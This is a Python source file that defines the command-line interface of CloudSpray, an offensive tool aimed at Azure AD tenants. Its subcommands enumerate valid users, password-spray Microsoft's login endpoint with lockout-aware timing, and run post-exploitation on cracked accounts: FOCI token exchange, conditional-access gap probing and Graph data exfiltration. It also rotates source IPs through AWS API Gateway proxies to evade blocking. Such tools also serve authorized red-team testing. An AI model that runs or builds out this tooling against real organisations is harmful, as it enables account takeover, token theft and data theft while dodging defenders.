"""Click-based CLI defining CloudSpray's command structure.

CloudSpray exposes four subcommands under the ``cloudspray`` entry point:

- ``enum``   -- Enumerate valid Azure AD users (OneDrive, Teams, MSOL, Login)
- ``spray``  -- Password spray against Azure AD with timing/lockout controls
- ``post``   -- Post-exploitation on valid credentials (FOCI exchange, CA probe, exfil)
- ``report`` -- Export results from the state database as JSON or CSV

The CLI follows a layered configuration approach:

1. YAML config file (``--config``) is loaded and merged with dataclass defaults
2. Individual CLI flags (``--delay``, ``--jitter``, etc.) override config values
3. The resulting config, logger, reporter, and DB path are stored in Click's
   ``ctx.obj`` dict and passed down to subcommands

All subcommands share the same SQLite database (``--db``) for state persistence
and resume support. The ``--verbose`` flag enables debug logging and shows
verbose output (e.g. failed password attempts, not-found users).

Proxy support (Fireprox via AWS API Gateway) is set up in ``_build_fireprox_session``
when the config enables it. Gateways are created before operations start and
torn down in a ``finally`` block to avoid leaving orphaned AWS resources.
"""

import time

import click

from cloudspray.config import CloudSprayConfig, load_config
from cloudspray.proxy import AWSGatewayProvider, ProxyManager
from cloudspray.proxy.session import FireproxSession
from cloudspray.reporting.console import ConsoleReporter
from cloudspray.state.db import StateDB
from cloudspray.utils import setup_logging


class MutuallyExclusive(click.Option):
    """Click option subclass that enforces mutual exclusivity with another option.

    Used for ``--passwords`` vs ``--password`` in the spray command -- the user
    must provide exactly one of them, not both.

    Usage::

        @click.option("-p", "--passwords", cls=MutuallyExclusive,
                      mutually_exclusive=["password"])

    Args:
        mutually_exclusive: List of option names that cannot be used alongside
            this option.
    """

    def __init__(self, *args, **kwargs):
        self.mutually_exclusive = set(kwargs.pop("mutually_exclusive", []))
        super().__init__(*args, **kwargs)

    def handle_parse_result(self, ctx, opts, args):
        """Check for conflicts and raise ``UsageError`` if both options are set."""
        current = self.name in opts and opts[self.name] is not None
        for other_name in self.mutually_exclusive:
            if other_name in opts and opts[other_name] is not None and current:
                raise click.UsageError(
                    f"--{self.name.replace('_', '-')} and "
                    f"--{other_name.replace('_', '-')} are mutually exclusive."
                )
        return super().handle_parse_result(ctx, opts, args)


@click.group()
@click.option(
    "--config", "-c",
    type=click.Path(exists=True),
    default=None,
    help="Path to YAML config file.",
)
@click.option(
    "--db",
    type=click.Path(),
    default="cloudspray.db",
    show_default=True,
    help="Path to SQLite state database.",
)
@click.option(
    "--verbose", "-v",
    is_flag=True,
    default=False,
    help="Enable debug logging and verbose output.",
)
@click.pass_context
def cli(ctx, config, db, verbose):
    """CloudSpray - Azure AD password sprayer and enumerator.

    Root command group. Loads config, sets up logging, and stores shared
    objects in ctx.obj for subcommands to use.
    """
    ctx.ensure_object(dict)

    cfg = load_config(config)
    ctx.obj["config"] = cfg
    ctx.obj["db_path"] = db
    ctx.obj["verbose"] = verbose

    log_level = "DEBUG" if verbose else "INFO"
    ctx.obj["logger"] = setup_logging(level=log_level)

    ctx.obj["reporter"] = ConsoleReporter(verbose=verbose)


# Maps enumeration method names to the Microsoft host that handles them.
# OneDrive is None here because its host is derived from the target domain
# at runtime (e.g. "contoso-my.sharepoint.com").
_ENUM_TARGET_HOSTS = {
    "msol": "login.microsoftonline.com",
    "login": "login.microsoftonline.com",
    "onedrive": None,
    "teams": "teams.microsoft.com",
}

# All spray requests go through the main Microsoft login endpoint.
_SPRAY_TARGET_HOST = "login.microsoftonline.com"


def _build_fireprox_session(
    config: CloudSprayConfig,
    target_host: str | None,
    reporter: ConsoleReporter,
) -> tuple[ProxyManager | None, FireproxSession | None]:
    """Create a FireproxSession backed by AWS API Gateway, if enabled.

    Fireprox creates temporary API Gateway endpoints in AWS that proxy
    HTTPS requests to the target host. Each gateway gets a unique AWS IP,
    providing IP rotation across spray attempts.

    The function handles the full lifecycle setup:
    1. Create an AWSGatewayProvider with the configured credentials/regions
    2. Deploy gateway endpoints targeting the specified host
    3. Wait for DNS propagation (5s)
    4. Run a health check to verify gateways are responding
    5. Return the session for use in spray/enum operations

    The caller is responsible for calling ``proxy_manager.teardown_all()``
    when done (typically in a ``finally`` block).

    Args:
        config: Full CloudSpray config with AWS gateway credentials.
        target_host: The Microsoft host to proxy to (e.g. "login.microsoftonline.com").
            If ``None``, proxy setup is skipped.
        reporter: Console reporter for status messages.

    Returns:
        Tuple of (ProxyManager, FireproxSession). Both are ``None`` when
        the proxy is disabled or target_host is ``None``.

    Raises:
        SystemExit: If the health check fails after gateway deployment.
    """
    if not config.proxy.aws_gateway.enabled or target_host is None:
        return None, None

    gw_cfg = config.proxy.aws_gateway
    provider = AWSGatewayProvider(
        access_key=gw_cfg.access_key,
        secret_key=gw_cfg.secret_key,
        regions=gw_cfg.regions,
    )

    manager = ProxyManager()
    manager.add_provider(provider)
    manager.setup_all(f"https://{target_host}")

    reporter.info("Waiting for gateways to propagate...")
    time.sleep(5)

    if not provider.health_check():
        reporter.error("Fireprox health check failed, tearing down gateways")
        manager.teardown_all()
        raise SystemExit(1)

    reporter.info(f"Fireprox ready: {len(provider._gateway_urls)} gateway(s) active")
    session = FireproxSession(provider, target_host)
    return manager, session


@cli.command("enum")
@click.option("-d", "--domain", required=True, help="Target domain.")
@click.option(
    "-u", "--users", required=True,
    type=click.Path(exists=True),
    help="Path to user list file.",
)
@click.option(
    "-m", "--method",
    type=click.Choice(["onedrive", "teams", "msol", "login"], case_sensitive=False),
    default="onedrive",
    show_default=True,
    help="Enumeration method.",
)
@click.option(
    "-o", "--output",
    type=click.Path(),
    default=None,
    help="Path to write valid usernames.",
)
@click.option("--teams-user", default=None, help="Teams auth username (for teams method).")
@click.option("--teams-pass", default=None, help="Teams auth password (for teams method).")
@click.pass_context
def enum_cmd(ctx, domain, users, method, output, teams_user, teams_pass):
    """Enumerate valid Azure AD users."""
    cfg = ctx.obj["config"]
    reporter = ctx.obj["reporter"]

    reporter.banner()

    # Override config with CLI args
    cfg.target.domain = domain
    if teams_user:
        cfg.enum.teams_user = teams_user
    if teams_pass:
        cfg.enum.teams_pass = teams_pass

    # Validate teams creds when using teams method
    if method == "teams" and (not cfg.enum.teams_user or not cfg.enum.teams_pass):
        reporter.error("Teams method requires --teams-user and --teams-pass.")
        raise SystemExit(1)

    from cloudspray.enumerators import OneDriveEnumerator, TeamsEnumerator, MSOLEnumerator, LoginEnumerator
    from cloudspray.utils import read_userlist

    userlist = read_userlist(users)

    # Determine target host for proxy routing
    target_host = _ENUM_TARGET_HOSTS[method]
    if method == "onedrive":
        target_host = f"{domain.split('.')[0]}-my.sharepoint.com"

    proxy_manager, proxy_session = _build_fireprox_session(cfg, target_host, reporter)

    try:
        with StateDB(ctx.obj["db_path"]) as db:
            reporter.info(f"Enumeration starting: domain={domain}, method={method}")
            reporter.info(f"User list: {users} ({len(userlist)} entries)")

            if method == "onedrive":
                enumerator = OneDriveEnumerator(domain, db, reporter, proxy_session=proxy_session)
                valid = enumerator.enumerate(userlist)
            elif method == "teams":
                enumerator = TeamsEnumerator(
                    domain, db, reporter,
                    auth_user=cfg.enum.teams_user,
                    auth_pass=cfg.enum.teams_pass,
                )
                valid = enumerator.enumerate(userlist)
            elif method == "msol":
                enumerator = MSOLEnumerator(domain, db, reporter, proxy_session=proxy_session)
                valid = enumerator.enumerate(userlist)
            elif method == "login":
                enumerator = LoginEnumerator(domain, db, reporter, proxy_session=proxy_session)
                valid = enumerator.enumerate(userlist)
            else:
                reporter.error(f"Unknown enumeration method: {method}")
                return

            if output:
                with open(output, "w", encoding="utf-8") as f:
                    f.write("\n".join(valid) + "\n")
                reporter.info(f"Valid users written to {output}")

            reporter.info(f"Enumeration complete: {len(valid)} valid users found")
    except (KeyboardInterrupt, SystemExit):
        raise
    except Exception as exc:
        reporter.error(f"Enumeration failed: {exc}")
        raise SystemExit(1) from exc
    finally:
        if proxy_manager is not None:
            reporter.info("Tearing down Fireprox gateways")
            proxy_manager.teardown_all()


@cli.command("spray")
@click.option("-d", "--domain", required=True, help="Target domain.")
@click.option(
    "-u", "--users", required=True,
    type=click.Path(exists=True),
    help="Path to user list file.",
)
@click.option(
    "-p", "--passwords",
    type=click.Path(exists=True),
    default=None,
    cls=MutuallyExclusive,
    mutually_exclusive=["password"],
    help="Path to password list file.",
)
@click.option(
    "-P", "--password",
    default=None,
    cls=MutuallyExclusive,
    mutually_exclusive=["passwords"],
    help="Single password string.",
)
@click.option("--delay", type=click.IntRange(min=0), default=None, help="Seconds between attempts per user.")
@click.option("--jitter", type=click.IntRange(min=0), default=None, help="Random jitter range in seconds.")
@click.option("--lockout-threshold", type=click.IntRange(min=1), default=None, help="Hard stop after N consecutive lockouts.")
@click.option("--lockout-cooldown", type=click.IntRange(min=0), default=None, help="Per-user lockout cooldown in seconds (default 1800).")
@click.option(
    "--shuffle",
    type=click.Choice(["standard", "aggressive"], case_sensitive=False),
    default=None,
    help="Shuffle mode for spray ordering.",
)
@click.option("--resume", is_flag=True, default=False, help="Resume from database state.")
@click.pass_context
def spray_cmd(ctx, domain, users, passwords, password, delay, jitter,
              lockout_threshold, lockout_cooldown, shuffle, resume):
    """Run a password spray against Azure AD."""
    cfg = ctx.obj["config"]
    reporter = ctx.obj["reporter"]

    reporter.banner()

    if not passwords and not password:
        reporter.error("Provide either -p/--passwords (file) or -P/--password (single).")
        raise SystemExit(1)

    # Override config with CLI args
    cfg.target.domain = domain
    if delay is not None:
        cfg.spray.delay = delay
    if jitter is not None:
        cfg.spray.jitter = jitter
    if lockout_threshold is not None:
        cfg.spray.lockout_threshold = lockout_threshold
    if lockout_cooldown is not None:
        cfg.spray.lockout_cooldown = lockout_cooldown
    if shuffle is not None:
        cfg.spray.shuffle_mode = shuffle

    from cloudspray.spray import Authenticator, SprayEngine
    from cloudspray.utils import read_userlist, read_password_list

    userlist = read_userlist(users)
    if passwords:
        passlist = read_password_list(passwords)
    else:
        passlist = [password]

    proxy_manager, proxy_session = _build_fireprox_session(cfg, _SPRAY_TARGET_HOST, reporter)

    try:
        with StateDB(ctx.obj["db_path"]) as db:
            reporter.info(f"Spray engine starting: domain={domain}")
            reporter.info(f"User list: {users} ({len(userlist)} entries)")
            reporter.info(
                f"Delay={cfg.spray.delay}s, Jitter={cfg.spray.jitter}s, "
                f"Shuffle={cfg.spray.shuffle_mode}"
            )
            authenticator = Authenticator(cfg.target.domain, proxy_session=proxy_session)
            engine = SprayEngine(cfg, db, authenticator, reporter)
            engine.run(userlist, passlist, resume=resume)
    except (KeyboardInterrupt, SystemExit):
        raise
    except Exception as exc:
        reporter.error(f"Spray failed: {exc}")
        raise SystemExit(1) from exc
    finally:
        if proxy_manager is not None:
            reporter.info("Tearing down Fireprox gateways")
            proxy_manager.teardown_all()


@cli.command("post")
@click.option("--foci", is_flag=True, default=False, help="Perform FOCI token exchange.")
@click.option("--ca-probe", is_flag=True, default=False, help="Probe conditional access policy gaps.")
@click.option("--exfil", is_flag=True, default=False, help="Lightweight data access check.")
@click.option("--user", default=None, help="Target specific user from valid credentials.")
@click.pass_context
def post_cmd(ctx, foci, ca_probe, exfil, user):
    """Post-exploitation actions on valid credentials."""
    reporter = ctx.obj["reporter"]

    reporter.banner()

    if not foci and not ca_probe and not exfil:
        reporter.error("Specify at least one action: --foci, --ca-probe, or --exfil.")
        raise SystemExit(1)

    from cloudspray.post import TokenManager, CAProbe, GraphExfil

    cfg = ctx.obj["config"]

    try:
        with StateDB(ctx.obj["db_path"]) as db:
            creds = db.get_valid_credentials()
            if not creds:
                reporter.error("No valid credentials in database. Run 'spray' first.")
                raise SystemExit(1)

            reporter.info(f"Post-exploitation: {len(creds)} valid credential(s) available.")
            if user:
                reporter.info(f"Targeting user: {user}")

            if foci:
                token_mgr = TokenManager(cfg.target.domain, db, reporter)
                results = token_mgr.exchange_all_valid_credentials()
                for username, tokens in results.items():
                    reporter.info(f"  {username}: {len(tokens)} tokens captured")

            if ca_probe:
                prober = CAProbe(cfg.target.domain, db, reporter)
                probe_results = prober.probe_all_blocked()
                prober.print_matrix(probe_results)

            if exfil:
                with GraphExfil(db, reporter) as exfiltrator:
                    if user:
                        exfiltrator.run_all(user)
                    else:
                        for cred in creds:
                            exfiltrator.run_all(cred.username)
    except (KeyboardInterrupt, SystemExit):
        raise
    except Exception as exc:
        reporter.error(f"Post-exploitation failed: {exc}")
        raise SystemExit(1) from exc


@cli.command("report")
@click.option(
    "-f", "--format",
    "output_format",
    type=click.Choice(["json", "csv"], case_sensitive=False),
    default="json",
    show_default=True,
    help="Report output format.",
)
@click.option(
    "-o", "--output", required=True,
    type=click.Path(),
    help="Output file path.",
)
@click.pass_context
def report_cmd(ctx, output_format, output):
    """Generate a report from the database."""
    reporter = ctx.obj["reporter"]

    reporter.banner()

    from cloudspray.reporting import JSONReporter, CSVReporter

    try:
        with StateDB(ctx.obj["db_path"]) as db:
            reporter.info(f"Generating {output_format.upper()} report: {output}")

            if output_format == "json":
                report_writer = JSONReporter(db)
            elif output_format == "csv":
                report_writer = CSVReporter(db)
            else:
                reporter.error(f"Unknown report format: {output_format}")
                return

            report_writer.generate(output)
            reporter.info(f"Report written to {output}")
    except (KeyboardInterrupt, SystemExit):
        raise
    except Exception as exc:
        reporter.error(f"Report generation failed: {exc}")
        raise SystemExit(1) from exc
